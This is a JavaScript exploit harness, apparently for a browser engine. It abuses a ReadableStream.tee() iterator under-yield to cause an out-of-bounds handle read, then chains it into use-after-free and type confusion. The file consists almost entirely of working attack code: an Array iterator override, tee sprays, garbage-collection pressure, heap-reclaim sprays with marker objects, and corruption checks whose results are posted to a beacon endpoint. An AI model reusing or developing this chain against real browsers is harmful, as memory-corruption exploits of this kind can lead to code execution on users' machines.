/*
 * p436 -- tee() OOB -> UAF -> type confusion chain
 *
 * The tee() SequenceConverter uses forEachInIterable (Symbol.iterator).
 * Under-yield (return 1 element) -> Vector has size 1.
 * C++ accesses results[1] OOB (ASSERT(size==2) compiled out).
 * results[1] is Strong<JSObject>: m_slot = 8 stale bytes = HandleSlot.
 *
 * HandleSlot = JSValue* into a HandleSet node. After Strong destroyed,
 * node freed but JSValue (pointing to old branch2) remains.
 *
 * Chain:
 *   Phase 1: Spray normal tees, capture branch2 internals, null everything
 *   Phase 2: GC pressure to free branch2 MarkedSpace cells
 *   Phase 3: Spray controlled objects to reclaim freed cells
 *   Phase 4: Under-yield tee reads stale HandleSlot -> reclaimed cell
 *   Phase 5: Type-confused ReadableStream wrapping our controlled object
 *
 * Beacon prefix: V436-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V436-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function makeStream(data) {
  return new ReadableStream({
    start: function(c) {
      c.enqueue(data || "x");
      c.close();
    }
  });
}

// ================================================================
// PHASE 1: Spray normal tees, keep ONLY branch refs temporarily
// Each tee creates a Vector<Strong<JSObject>> with 2 elements.
// After tee() returns, Vector is destroyed, Strongs freed.
// But the freed 128-byte Vector block still has stale HandleSlot at +8.
// And the HandleSet node still has JSValue pointing to branch2 internal.
// ================================================================

function sprayNormalTees(count) {
  var branches = [];
  for (var i = 0; i < count; i++) {
    var rs = makeStream("spray-" + i);
    var intercepted = false;

    Array.prototype[Symbol.iterator] = function() {
      var self = this;
      if (Array.isArray(self) && self.length === 2 && !intercepted) {
        if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
          intercepted = true;
        }
      }
      return origIter.call(self);
    };

    try {
      var b = rs.tee();
      Array.prototype[Symbol.iterator] = origIter;
      branches.push(b);
    } catch(e) {
      Array.prototype[Symbol.iterator] = origIter;
    }
  }
  return branches;
}

// Under-yield tee
function underYieldTee() {
  var rs = makeStream("underyield");
  var hooked = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !hooked) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        hooked = true;
        var items = [self[0]]; // ONLY 1 element -> results[1] OOB
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, hooked: hooked};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return {err: e.message.slice(0, 100), hooked: hooked};
  }
}

function probeResult(label, r) {
  if (r.err) {
    B(label + "-ERR", r.err);
    return;
  }
  if (!r.branches) {
    B(label + "-NO-BRANCHES");
    return;
  }
  var b0 = r.branches[0];
  var b1 = r.branches[1];

  B(label + "-B0", {
    type: typeof b0,
    isRS: b0 instanceof ReadableStream,
    ctor: b0 && b0.constructor ? b0.constructor.name : "?"
  });

  if (!b1) {
    B(label + "-B1-NULL");
    return;
  }

  B(label + "-B1", {
    type: typeof b1,
    isRS: b1 instanceof ReadableStream,
    ctor: b1.constructor ? b1.constructor.name : "?"
  });

  // Try locked
  try {
    B(label + "-B1-LOCKED", b1.locked);
  } catch(e) {
    B(label + "-B1-LOCKED-ERR", e.message.slice(0, 60));
  }

  // Try getReader
  try {
    var reader = b1.getReader();
    B(label + "-B1-READER-OK!!!");
    reader.read().then(function(chunk) {
      B(label + "-B1-READ", {done: chunk.done, val: chunk.value === undefined ? "undef" : String(chunk.value).slice(0, 60)});
      reader.releaseLock();
    }).catch(function(e) {
      B(label + "-B1-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B(label + "-B1-READER-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// TEST A: Baseline under-yield with no spray (crash oracle, small)
// If this crashes immediately, the OOB bytes are zero/invalid.
// ================================================================
function testA() {
  B("A-START");
  // Do 5 warmup tees to populate the size class
  var warmup = sprayNormalTees(5);
  // Null them to free
  for (var i = 0; i < warmup.length; i++) warmup[i] = null;

  var r = underYieldTee();
  probeResult("A", r);
}

// ================================================================
// TEST B: Spray 50, keep alive, under-yield
// The freed Vector block should have a stale HandleSlot.
// HandleSlot node still has JSValue -> branch2 object (still alive
// because we kept tee results).
// ================================================================
function testB() {
  B("B-START");
  var tees = sprayNormalTees(50);
  B("B-SPRAYED", tees.length);

  var r = underYieldTee();
  probeResult("B", r);

  B("B-TEES-ALIVE", tees.length);
  // Keep tees reference alive to prevent GC
}

// ================================================================
// TEST C: Spray 100, NULL all refs, GC pressure, then under-yield
// Branch2 objects become collectible. GC frees their cells.
// Under-yield reads stale HandleSlot -> stale JSValue -> freed cell.
// This should crash or give garbage IF GC collected the objects.
// ================================================================
function testC() {
  B("C-START");
  var tees = sprayNormalTees(100);
  B("C-SPRAYED", tees.length);

  // Null all references -> branch internals become GC-collectible
  for (var i = 0; i < tees.length; i++) tees[i] = null;
  tees = null;

  // GC pressure: allocate/free large ArrayBuffers
  for (var i = 0; i < 30; i++) {
    try { new ArrayBuffer(4 * 1024 * 1024); } catch(e) {}
  }
  B("C-GC-DONE");

  var r = underYieldTee();
  probeResult("C", r);
}

// ================================================================
// TEST D: Spray 100, NULL, GC, spray CONTROLLED objects, under-yield
// After GC frees branch2 cells, we spray objects of same size class
// to reclaim the freed cells. Under-yield gives us type-confused
// ReadableStream wrapping our controlled object.
//
// Branch2 internal stream is a plain JSObject with ~6 private-name
// properties. Estimated size: 80 bytes in MarkedSpace.
// We spray Float64Array objects to reclaim (also ~80 bytes).
// ================================================================
function testD() {
  B("D-START");
  var tees = sprayNormalTees(100);
  B("D-SPRAYED", tees.length);

  // Release all
  for (var i = 0; i < tees.length; i++) tees[i] = null;
  tees = null;

  // GC pressure
  for (var i = 0; i < 30; i++) {
    try { new ArrayBuffer(4 * 1024 * 1024); } catch(e) {}
  }
  B("D-GC-DONE");

  // Spray controlled objects to reclaim freed cells
  // Use plain objects with specific properties
  var reclaimers = [];
  for (var i = 0; i < 500; i++) {
    // Create objects that might land in the same size class
    // as the branch2 internal stream objects
    var obj = {};
    obj.marker = 0x41414141;
    obj.idx = i;
    obj.a = i * 0.1;
    obj.b = i * 0.2;
    obj.c = i * 0.3;
    obj.d = i * 0.4;
    reclaimers.push(obj);
  }
  B("D-RECLAIMED", reclaimers.length);

  var r = underYieldTee();
  probeResult("D", r);

  // Check if we can find our marker in the confused object
  if (r.branches && r.branches[1]) {
    try {
      var confused = r.branches[1];
      // If type-confused, accessing stream properties reads our object's memory
      // The "locked" property reads from the internal stream, which checks
      // @getByIdDirectPrivate(stream, "reader") -- reads our object's fields
      B("D-CONFUSED-TYPE", typeof confused);
    } catch(e) {
      B("D-CONFUSED-ERR", e.message.slice(0, 80));
    }
  }

  B("D-ALIVE", reclaimers.length);
}

// ================================================================
// TEST E: Same as D but spray ArrayBuffers of matching size
// ArrayBuffer JSCell is ~64 bytes. Try different sizes.
// ================================================================
function testE() {
  B("E-START");
  var tees = sprayNormalTees(100);
  B("E-SPRAYED", tees.length);

  for (var i = 0; i < tees.length; i++) tees[i] = null;
  tees = null;

  // Heavy GC
  for (var i = 0; i < 50; i++) {
    try { new ArrayBuffer(4 * 1024 * 1024); } catch(e) {}
  }
  B("E-GC-DONE");

  // Spray ArrayBuffers -- the AB JSCell might share size class with
  // the internal stream plain JSObject
  var abs = [];
  for (var i = 0; i < 500; i++) {
    var ab = new ArrayBuffer(16);
    var view = new Float64Array(ab);
    view[0] = 1.1 + i * 0.001;
    view[1] = 2.2 + i * 0.001;
    abs.push({ab: ab, view: view});
  }
  B("E-AB-SPRAYED", abs.length);

  var r = underYieldTee();
  probeResult("E", r);

  // Check for corruption in our ABs
  var corrupted = 0;
  for (var i = 0; i < abs.length; i++) {
    try {
      var v = abs[i].view;
      var expected0 = 1.1 + i * 0.001;
      if (Math.abs(v[0] - expected0) > 0.0001 && v[0] !== 0) {
        corrupted++;
        if (corrupted <= 3) {
          B("E-AB-CORRUPT-" + i, {v0: v[0], v1: v[1], expected: expected0, byteLen: abs[i].ab.byteLength});
        }
      }
    } catch(e) {}
  }
  B("E-CORRUPT-COUNT", corrupted);
  B("E-ALIVE", abs.length);
}

// ================================================================
// TEST F: Diagnostic -- what exact SIZE is the branch2 internal?
// Spray tees, capture a branch2, check its structure
// ================================================================
function testF() {
  B("F-START");

  var rs = makeStream("diag");
  var captured = null;
  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        captured = {b1: self[0], b2: self[1]};
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
  }

  if (captured) {
    var b2 = captured.b2;
    // Try to enumerate what properties exist
    var keys = [];
    try {
      keys = Object.keys(b2);
    } catch(e) {}

    var ownProps = [];
    try {
      ownProps = Object.getOwnPropertyNames(b2);
    } catch(e) {}

    var symbols = [];
    try {
      symbols = Object.getOwnPropertySymbols(b2).map(function(s) { return s.toString(); });
    } catch(e) {}

    B("F-B2-KEYS", {
      keys: keys.slice(0, 10).join(","),
      props: ownProps.slice(0, 10).join(","),
      symbols: symbols.slice(0, 10).join(","),
      ctor: b2.constructor ? b2.constructor.name : "?",
      proto: Object.getPrototypeOf(b2) === Object.prototype ? "Object" : "other"
    });
  } else {
    B("F-NO-CAPTURE");
  }
}

// Run tests with delays. Put dangerous ones (C, D, E) last.
// B is safe (keeps refs). F is diagnostic. A is crash oracle.
setTimeout(function() { testF(); }, 100);
setTimeout(function() { testB(); }, 400);
setTimeout(function() { testA(); }, 800);
setTimeout(function() { testC(); }, 1500);
setTimeout(function() { testD(); }, 3000);
setTimeout(function() { testE(); }, 5000);
setTimeout(function() { B("DONE"); }, 8000);
})();
